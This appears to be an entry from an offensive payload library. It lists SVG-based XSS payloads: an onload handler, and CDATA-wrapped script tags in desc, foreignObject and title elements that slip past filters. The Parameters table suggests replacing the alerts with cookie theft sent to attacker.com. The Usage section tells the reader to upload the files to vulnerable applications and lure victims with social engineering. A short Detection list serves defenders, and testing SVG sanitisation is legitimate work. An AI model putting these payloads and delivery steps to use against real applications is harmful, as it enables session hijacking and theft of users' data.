---
id: f5d986b0-5df7-46bd-81dd-2624924e5393
name: SVG-XSS-Injection-Payloads
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:42.060881+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - xss
  - svg-injection
  - payload
platforms:
  - Web
validated: true
---

# SVG-XSS-Injection-Payloads

## Code

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>

<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

## Description

This code provides multiple SVG-based payloads for injecting and executing JavaScript in a victim's browser when the SVG file is rendered. The 'onload' attribute triggers immediately on parsing, while CDATA-wrapped <script> tags in <desc>, <foreignObject>, and <title> elements bypass simple text-based filters. These are used in XSS attacks targeting SVG upload vulnerabilities to steal session data or perform client-side actions.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(document.domain) | Replace with custom JS, e.g., fetch to exfiltrate data | alert('XSS'); or document.location='http://attacker.com?cookie='+document.cookie |
| alert(1), alert(2), alert(3) | Placeholder alerts; customize per bypass need | Similar custom JS for data theft or keylogging |

## Usage

Embed these snippets into a .svg file and upload to a vulnerable web application. Lure victims to view the file via a link. Ideal for testing SVG sanitization in red team engagements or demonstrating XSS in file upload features. Combine with social engineering for delivery.

## Detection

- Web application firewalls (WAFs) scanning for 'onload=' or '<script>' in image uploads.
- Browser CSP violations logged when inline scripts execute from SVG contexts.
- File analysis tools detecting JavaScript in XML/SVG files (e.g., via regex for CDATA script tags).
- Anomalous network requests from image renders to external domains.

## Related

- [[procedures/Inject-XSS-via-SVG-Files]]
